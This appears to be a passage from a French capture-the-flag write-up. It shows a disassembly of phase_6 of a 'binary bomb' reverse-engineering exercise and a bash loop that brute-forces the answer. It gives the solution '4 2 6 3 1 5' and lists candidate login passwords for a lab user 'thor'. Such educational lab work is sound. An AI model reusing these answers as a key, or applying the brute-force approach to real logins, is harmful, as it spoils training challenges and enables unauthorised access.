│           0x08048db3      e820020000     call sym.read_six_numbers
│           0x08048db8      31ff           xor edi, edi
│           0x08048dba      83c410         add esp, 0x10
│           0x08048dbd      8d7600         lea esi, [esi]
│              ; JMP XREF from 0x08048e00 (sym.phase_6)
│       ┌─> 0x08048dc0      8d45e8         lea eax, [local_18h]
│       ⁝   0x08048dc3      8b04b8         mov eax, dword [eax + edi*4]
│       ⁝   0x08048dc6      48             dec eax
│       ⁝   0x08048dc7      83f805         cmp eax, 5                  ; aeim.fd
│      ┌──< 0x08048dca      7605           jbe 0x8048dd1
│      │⁝   0x08048dcc      e82b070000     call sym.explode_bomb
│      │:      ; JMP XREF from 0x08048dca (sym.phase_6)
│      └──> 0x08048dd1      8d5f01         lea ebx, [edi + 1]          ; eflags
│       ⁝   0x08048dd4      83fb05         cmp ebx, 5                  ; aeim.fd
│      ┌──< 0x08048dd7      7f23           jg 0x8048dfc
│      │⁝   0x08048dd9      8d04bd000000.  lea eax, [edi*4]
│      │⁝   0x08048de0      8945c8         mov dword [local_38h], eax
│      │⁝   0x08048de3      8d75e8         lea esi, [local_18h]
│      │:      ; JMP XREF from 0x08048dfa (sym.phase_6)
│     ┌───> 0x08048de6      8b55c8         mov edx, dword [local_38h]
│     ⁝│⁝   0x08048de9      8b0432         mov eax, dword [edx + esi]
│     ⁝│⁝   0x08048dec      3b049e         cmp eax, dword [esi + ebx*4]
│    ┌────< 0x08048def      7505           jne 0x8048df6
│    │⁝│⁝   0x08048df1      e806070000     call sym.explode_bomb
│    │:│:      ; JMP XREF from 0x08048def (sym.phase_6)
│    └────> 0x08048df6      43             inc ebx
│     ⁝│⁝   0x08048df7      83fb05         cmp ebx, 5                  ; aeim.fd
│     └───< 0x08048dfa      7eea           jle 0x8048de6
│      │:      ; JMP XREF from 0x08048dd7 (sym.phase_6)
│      └──> 0x08048dfc      47             inc edi
│       ⁝   0x08048dfd      83ff05         cmp edi, 5                  ; aeim.fd
│       └─< 0x08048e00      7ebe           jle 0x8048dc0
│           0x08048e02      31ff           xor edi, edi
│           0x08048e04      8d4de8         lea ecx, [local_18h]
│           0x08048e07      8d45d0         lea eax, [local_30h]
│           0x08048e0a      8945c4         mov dword [local_3ch], eax
│           0x08048e0d      8d7600         lea esi, [esi]
│              ; JMP XREF from 0x08048e42 (sym.phase_6)
│       ┌─> 0x08048e10      8b75cc         mov esi, dword [local_34h]
│       ⁝   0x08048e13      bb01000000     mov ebx, 1
│       ⁝   0x08048e18      8d04bd000000.  lea eax, [edi*4]
│       ⁝   0x08048e1f      89c2           mov edx, eax
│       ⁝   0x08048e21      3b1c08         cmp ebx, dword [eax + ecx]
│      ┌──< 0x08048e24      7d12           jge 0x8048e38
│      │⁝   0x08048e26      8b040a         mov eax, dword [edx + ecx]
│      │⁝   0x08048e29      8db426000000.  lea esi, [esi]
│      │:      ; JMP XREF from 0x08048e36 (sym.phase_6)
│     ┌───> 0x08048e30      8b7608         mov esi, dword [esi + 8]    ; [0x8:4]=-1 ; 8
│     ⁝│⁝   0x08048e33      43             inc ebx
│     ⁝│⁝   0x08048e34      39c3           cmp ebx, eax
│     └───< 0x08048e36      7cf8           jl 0x8048e30
│      │:      ; JMP XREF from 0x08048e24 (sym.phase_6)
│      └──> 0x08048e38      8b55c4         mov edx, dword [local_3ch]
│       ⁝   0x08048e3b      8934ba         mov dword [edx + edi*4], esi
│       ⁝   0x08048e3e      47             inc edi
│       ⁝   0x08048e3f      83ff05         cmp edi, 5                  ; aeim.fd
│       └─< 0x08048e42      7ecc           jle 0x8048e10
│           0x08048e44      8b75d0         mov esi, dword [local_30h]
│           0x08048e47      8975cc         mov dword [local_34h], esi
│           0x08048e4a      bf01000000     mov edi, 1
│           0x08048e4f      8d55d0         lea edx, [local_30h]
│              ; JMP XREF from 0x08048e5e (sym.phase_6)
│       ┌─> 0x08048e52      8b04ba         mov eax, dword [edx + edi*4]
│       ⁝   0x08048e55      894608         mov dword [esi + 8], eax
│       ⁝   0x08048e58      89c6           mov esi, eax
│       ⁝   0x08048e5a      47             inc edi
│       ⁝   0x08048e5b      83ff05         cmp edi, 5                  ; aeim.fd
│       └─< 0x08048e5e      7ef2           jle 0x8048e52
│           0x08048e60      c74608000000.  mov dword [esi + 8], 0
│           0x08048e67      8b75cc         mov esi, dword [local_34h]
│           0x08048e6a      31ff           xor edi, edi
│           0x08048e6c      8d742600       lea esi, [esi]
│              ; JMP XREF from 0x08048e85 (sym.phase_6)
│       ┌─> 0x08048e70      8b5608         mov edx, dword [esi + 8]    ; [0x8:4]=-1 ; 8
│       ⁝   0x08048e73      8b06           mov eax, dword [esi]
│       ⁝   0x08048e75      3b02           cmp eax, dword [edx]
│      ┌──< 0x08048e77      7d05           jge 0x8048e7e
│      │⁝   0x08048e79      e87e060000     call sym.explode_bomb
│      │:      ; JMP XREF from 0x08048e77 (sym.phase_6)
│      └──> 0x08048e7e      8b7608         mov esi, dword [esi + 8]    ; [0x8:4]=-1 ; 8
│       ⁝   0x08048e81      47             inc edi
│       ⁝   0x08048e82      83ff04         cmp edi, 4                  ; 4
│       └─< 0x08048e85      7ee9           jle 0x8048e70
│           0x08048e87      8d65a8         lea esp, [local_58h]
│           0x08048e8a      5b             pop ebx
│           0x08048e8b      5e             pop esi
│           0x08048e8c      5f             pop edi
│           0x08048e8d      89ec           mov esp, ebp
│           0x08048e8f      5d             pop ebp
└           0x08048e90      c3             ret


en plus du fait que cette fonction est horrible qu'est qu'on peut voir ? qu'il y a un appel a read_six_numbers
le hint demisitifie le premier caractere: c'est un 4!
plus que 5!
on voit plusieur boucles qui transforme les valeurs les une apres les autres, les valeurs sont decremetées de 1 avant d'être comparées à 5 et si une est superieure le programme s'arrete

donc on a un 4 suivie de 5 valeur ne pouvant pas depasser 6 apres moultes essayes le brut force devient une option!
donc j'ecris dans un fichier rep1_5 les reponse au 5 premieres etapes de la bomb
puis :

 for x in {0..6} ; do for y in {0..6} ;do for a in {0..6} ; do for b in {0..6} ; do for c in {0..6}; do cat rep1_5 > file ; echo "4 $x $y $a $b $c"  >> file  ; cat file  | ./bomb | grep "Congratulations" && echo "4 $x $y $a $b $c" ; done ; done ; done; done ; done
Congratulations! You've defused the bomb!
4 2 6 3 1 5

wouhouuuuu! reflexion de l'instant: pourquoi etre inteligent alors qu'on a un shell

avec les trois reponse possible de la phase_3

on a trois clée potentielles pour se log sur thor:
Publicspeakingisveryeasy.126241207201b2149opekma426315
Publicspeakingisveryeasy.126241207202b7559opekma426315
Publicspeakingisveryeasy.126241207207b5249opekma426315

bon aucune ne marche mais deux caracteres a inverser peut etre...
suspense!

